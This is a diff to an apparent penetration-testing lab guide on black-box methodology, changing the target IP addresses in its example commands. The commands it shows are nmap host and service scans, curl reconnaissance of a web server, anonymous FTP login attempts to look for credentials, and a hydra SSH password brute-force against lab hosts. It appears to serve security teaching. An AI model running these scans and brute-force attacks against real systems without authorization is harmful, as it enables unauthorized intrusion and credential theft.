@@ -68,7 +68,7 @@ nmap -sn 10.10.8.0/24
 
 ```bash
 # What services are running on discovered hosts?
-nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7
+nmap -sC -sV 10.10.8.10 10.10.8.11 10.10.8.12 10.10.8.13 10.10.8.14
 ```
 
 **Why This Phase is Second in Black Box:**
@@ -97,7 +97,7 @@ nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7
 
 **2. Information Goldmine**
 ```bash
-curl http://172.20.0.3
+curl http://10.10.8.10
 # Discovers:
 # - Employee names → Potential usernames
 # - Email formats → Domain patterns  
@@ -114,7 +114,7 @@ Strategy: Use in targeted password attacks
 
 ##### **📁 Then FTP Services**
 ```bash
-ftp 172.20.0.5
+ftp 10.10.8.12
 # Try: anonymous/anonymous
 # Look for: configuration files, documents, credentials
 ```
@@ -142,7 +142,7 @@ echo "company123" >> passwords.txt
 echo "password" >> passwords.txt
 
 # Launch targeted attack
-hydra -L users.txt -P passwords.txt 172.20.0.4 ssh -s 2222
+hydra -L users.txt -P passwords.txt 10.10.8.11 ssh -s 2222
 ```
 
 ---
@@ -200,7 +200,7 @@ nmap -sn 10.10.8.0/24        # Find what exists
 # Phase 2: Service Discovery (Active - Required)
 nmap -sC -sV [discovered IPs] # Find what services run
 # Phase 3: Intelligence Gathering (Passive - Now possible)
-curl http://172.20.0.3         # Extract intelligence
+curl http://10.10.8.10         # Extract intelligence
 # Phase 4: Exploitation (Active - Targeted)
 hydra -L users.txt [target] ssh # Informed attacks
 ```
